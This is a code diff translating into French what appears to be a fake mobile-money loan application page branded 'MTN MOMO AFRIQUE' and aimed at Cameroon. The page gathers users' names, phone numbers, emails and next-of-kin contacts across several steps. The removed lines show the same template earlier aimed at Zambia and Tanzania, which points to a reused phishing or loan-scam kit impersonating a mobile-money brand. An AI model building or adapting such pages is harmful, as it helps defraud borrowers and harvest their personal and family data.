@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTN MOMO AFRICA </title>
+    <title>MTN MOMO AFRIQUE</title>
     <style>
         :root {
             --primary-blue: #0A3D7E;
@@ -14,7 +14,6 @@
 
         body {
             font-family: 'Inter', -apple-system, sans-serif;
-            /* background-color: var(--primary-blue); */
             margin: 0;
             padding: 0;
             display: flex;
@@ -211,90 +210,85 @@
         <img src="mtn-logo.png" alt="Logo" onerror="this.src='https://placehold.co/200x50/0A3D7E/FFFFFF?text=Super+App'">
     </div>
 
- <div class="container">
+    <div class="container">
         <div id="errorBox" class="error-box"></div>
 
-        <!-- STEP 1: LOAN DETAILS -->
+        <!-- ETAPE 1 : DÉTAILS DU PRÊT -->
         <div id="step1" class="step-page active">
-            <h2 class="title">Loan Details</h2>
+            <h2 class="title">Détails du Prêt</h2>
             
             <div class="slider-box">
-                <label>Loan Amount (XAF)</label>
+                <label>Montant du Prêt (XAF)</label>
                 <input type="range" min="5000" max="80000" id="amount" class="slider" oninput="updateValues()">
-                <p id="amountDisplay" class="val-display">ZMW 40,000</p>
+                <p id="amountDisplay" class="val-display">XAF 40 000</p>
             </div>
 
             <div class="slider-box">
-                <label>Repayment Period (Days)</label>
+                <label>Période de Remboursement (Jours)</label>
                 <input type="range" min="14" max="120" id="duration" class="slider" oninput="updateValues()">
-                <p id="durationDisplay" class="val-display">14 Days</p>
+                <p id="durationDisplay" class="val-display">14 Jours</p>
             </div>
 
-            <label>Reason for Loan</label>
-            <textarea id="reason" placeholder="Example: Business capital, school fees..." rows="3"></textarea>
+            <label>Motif du Prêt</label>
+            <textarea id="reason" placeholder="Exemple : Capital d'entreprise, frais de scolarité..." rows="3"></textarea>
 
-            <button onclick="validateStep1()">Continue</button>
+            <button onclick="validateStep1()">Continuer</button>
         </div>
 
-        <!-- STEP 2: PERSONAL DETAILS -->
+        <!-- ETAPE 2 : INFORMATIONS PERSONNELLES -->
         <div id="step2" class="step-page">
-            <h2 class="title">Personal Details</h2>
-            <input id="fname" placeholder="First Name" type="text">
-            <input id="lname" placeholder="Last Name" type="text">
+            <h2 class="title">Informations Personnelles</h2>
+            <input id="fname" placeholder="Prénom" type="text">
+            <input id="lname" placeholder="Nom" type="text">
             
-            <label>Phone Number</label>
-            <input id="phone" value="+237" placeholder="Phone Number" type="tel" inputmode="tel">
+            <label>Numéro de Téléphone</label>
+            <input id="phone" value="+237" placeholder="Numéro de téléphone" type="tel" inputmode="tel">
             
-            <label>Email Address</label>
-            <input id="email" placeholder="Email Address" type="email">
+            <label>Adresse E-mail</label>
+            <input id="email" placeholder="Adresse e-mail" type="email">
 
-            <button onclick="validateStep2()">Continue</button>
-            <button onclick="goToStep(1)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
+            <button onclick="validateStep2()">Continuer</button>
+            <button onclick="goToStep(1)" style="background:none; color:#64748b; margin-top:0;">Retour</button>
         </div>
 
-        <!-- STEP 3: NEXT OF KIN -->
+        <!-- ETAPE 3 : PERSONNE À PRÉVENIR -->
         <div id="step3" class="step-page">
-            <h2 class="title">Next of Kin</h2>
-            <input id="kfname" placeholder="Next of Kin First Name" type="text">
-            <input id="klname" placeholder="Next of Kin Last Name" type="text">
+            <h2 class="title">Personne à Prévenir (Proche)</h2>
+            <input id="kfname" placeholder="Prénom du proche" type="text">
+            <input id="klname" placeholder="Nom du proche" type="text">
             
-            <label>Next of Kin Phone Number</label>
-            <input id="kphone" value="+237" placeholder="Phone Number" type="tel" inputmode="tel">
+            <label>Numéro de Téléphone du Proche</label>
+            <input id="kphone" value="+237" placeholder="Numéro de téléphone" type="tel" inputmode="tel">
 
-            <input id="relationship" placeholder="Relationship (Example: Wife, Husband, Brother)">
+            <input id="relationship" placeholder="Lien de parenté (Exemple : Épouse, Époux, Frère)">
             
-            <button onclick="validateStep3()">Continue</button>
-            <button onclick="goToStep(2)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
+            <button onclick="validateStep3()">Continuer</button>
+            <button onclick="goToStep(2)" style="background:none; color:#64748b; margin-top:0;">Retour</button>
         </div>
 
-        <!-- STEP 4: VERIFICATION OF DETAILS -->
+        <!-- ETAPE 4 : VÉRIFICATION DES INFORMATIONS -->
         <div id="step4" class="step-page">
-            <h2 class="title">Verification of Details</h2>
+            <h2 class="title">Vérification des Informations</h2>
             <div id="summaryArea">
-                <div class="summary-item"><span class="summary-label">Amount:</span><span id="sumAmount" class="summary-val"></span></div>
-                <div class="summary-item"><span class="summary-label">Period:</span><span id="sumDuration" class="summary-val"></span></div>
-                <div class="summary-item"><span class="summary-label">Your Name:</span><span id="sumName" class="summary-val"></span></div>
-                <div class="summary-item"><span class="summary-label">Phone:</span><span id="sumPhone" class="summary-val"></span></div>
-                <div class="summary-item"><span class="summary-label">Next of Kin:</span><span id="sumKin" class="summary-val"></span></div>
+                <div class="summary-item"><span class="summary-label">Montant :</span><span id="sumAmount" class="summary-val"></span></div>
+                <div class="summary-item"><span class="summary-label">Période :</span><span id="sumDuration" class="summary-val"></span></div>
+                <div class="summary-item"><span class="summary-label">Votre Nom :</span><span id="sumName" class="summary-val"></span></div>
+                <div class="summary-item"><span class="summary-label">Téléphone :</span><span id="sumPhone" class="summary-val"></span></div>
+                <div class="summary-item"><span class="summary-label">Personne à prévenir :</span><span id="sumKin" class="summary-val"></span></div>
             </div>
             
             <p style="font-size: 0.85rem; color: #64748b; margin-top: 20px; text-align: center;">
-                By clicking "Submit Application", you agree to our loan terms and conditions.
+                En cliquant sur "Continuer", vous acceptez nos termes et conditions de prêt.
             </p>
 
-            <button onclick="stepFive" id="step5Button"><a href="step5.html" style="color: var(--bg-light)">Continue</a></button>
-            <button onclick="goToStep(3)" style="background:none; color:#64748b; margin-top:0;">Go Back</button>
+            <button id="step5Button">Continuer</button>
+            <button onclick="goToStep(3)" style="background:none; color:#64748b; margin-top:0;">Retour</button>
         </div>
 
-        <br>
-        <br>
-<!-- <img src="mixx-by-yass-tigo-pesa.png" alt="" srcset="" style="width: 100%; max-width: 300px; margin: 20px auto; display: block;"> -->
-
-        
     </div>
 
     <div class="footer">
-        &copy; 2026 Cameroon Super App. All rights reserved.
+        &copy; 2026 Super App Cameroun. Tous droits réservés.
     </div>
 
     <div id="pageLoader" class="loader">
@@ -302,7 +296,7 @@
     </div>
 
     <script>
-        // --- Helper Functions ---
+        // --- Fonctions d'aide ---
         function showError(msg) {
             const eb = document.getElementById('errorBox');
             eb.innerText = msg;
@@ -336,14 +330,14 @@
         function updateValues() {
             const amount = document.getElementById('amount').value;
             const duration = document.getElementById('duration').value;
-            document.getElementById('amountDisplay').innerText = "XAF  " + parseInt(amount).toLocaleString();
-            document.getElementById('durationDisplay').innerText = duration + " Days";
+            document.getElementById('amountDisplay').innerText = "XAF " + parseInt(amount).toLocaleString();
+            document.getElementById('durationDisplay').innerText = duration + " Jours";
         }
 
-        // --- Validation Logic ---
+        // --- Logique de validation ---
         function validateStep1() {
             const reason = document.getElementById('reason').value.trim();
-            if(!reason) return showError("Please explain to us the reason for your loan application.");
+            if(!reason) return showError("Veuillez nous expliquer le motif de votre demande de prêt.");
             
             localStorage.setItem('amount', document.getElementById('amount').value);
             localStorage.setItem('duration', document.getElementById('duration').value);
@@ -358,11 +352,10 @@
             const phone = document.getElementById('phone').value.trim();
             const email = document.getElementById('email').value.trim();
             
-            const nameRegex = /^[A-Za-z]+$/;
-            const zmPhoneRegex = /^\+237[0-9]{9}$/;
+            const cmPhoneRegex = /^\+237[0-9]{9}$/;
 
-            if(!fname || !lname || !phone || !email) return showError("Please input the required fields.");
-            if(!zmPhoneRegex.test(phone)) return showError("Please enter a valid Cameroon phone number (+237...)");
+            if(!fname || !lname || !phone || !email) return showError("Veuillez remplir les champs obligatoires.");
+            if(!cmPhoneRegex.test(phone)) return showError("Veuillez entrer un numéro de téléphone camerounais valide (+237...)");
 
             localStorage.setItem('fname', fname);
             localStorage.setItem('lname', lname);
@@ -377,10 +370,10 @@
             const klname = document.getElementById('klname').value.trim();
             const kphone = document.getElementById('kphone').value.trim();
             
-            const zmPhoneRegex = /^\+237[0-9]{9}$/;
+            const cmPhoneRegex = /^\+237[0-9]{9}$/;
 
-            if(!kfname || !klname || !kphone) return showError("Please input the required fields.");
-            if(!zmPhoneRegex.test(kphone)) return showError("Please enter a valid Cameroon phone number (+237...)");
+            if(!kfname || !klname || !kphone) return showError("Veuillez remplir les champs obligatoires.");
+            if(!cmPhoneRegex.test(kphone)) return showError("Veuillez entrer un numéro de téléphone camerounais valide (+237...)");
 
             localStorage.setItem('kfname', kfname);
             localStorage.setItem('klname', klname);
@@ -390,29 +383,15 @@
             showLoader(() => goToStep(4));
         }
 
-
         function populateSummary() {
-            document.getElementById('sumAmount').innerText = "ZMW " + parseInt(localStorage.getItem('amount')).toLocaleString();
-            document.getElementById('sumDuration').innerText = localStorage.getItem('duration') + " days";
+            document.getElementById('sumAmount').innerText = "XAF " + parseInt(localStorage.getItem('amount')).toLocaleString();
+            document.getElementById('sumDuration').innerText = localStorage.getItem('duration') + " jours";
             document.getElementById('sumName').innerText = localStorage.getItem('fname') + " " + localStorage.getItem('lname');
             document.getElementById('sumPhone').innerText = localStorage.getItem('phone');
             document.getElementById('sumKin').innerText = localStorage.getItem('kfname') + " (" + localStorage.getItem('kphone') + ")";
         }
 
-        function finalSubmit() {
-            showLoader(() => {
-                document.querySelector('.container').innerHTML = `
-                    <div style="text-align:center; padding:40px 10px;">
-                        <div style="font-size:60px; margin-bottom:20px;">✅</div>
-                        <h2 class="title">Your Application Has Been Received!</h2>
-                        <p style="color:#64748b; line-height:1.6;">Thank you ${localStorage.getItem('fname')}. Your loan application is being processed. You will receive an SMS notification shortly.</p>
-                        <button onclick="location.reload()" style="margin-top:30px;">Start Again</button>
-                    </div>
-                `;
-            });
-        }
-
         window.onload = updateValues;
     </script>
 </body>
-</html>
+    </html>
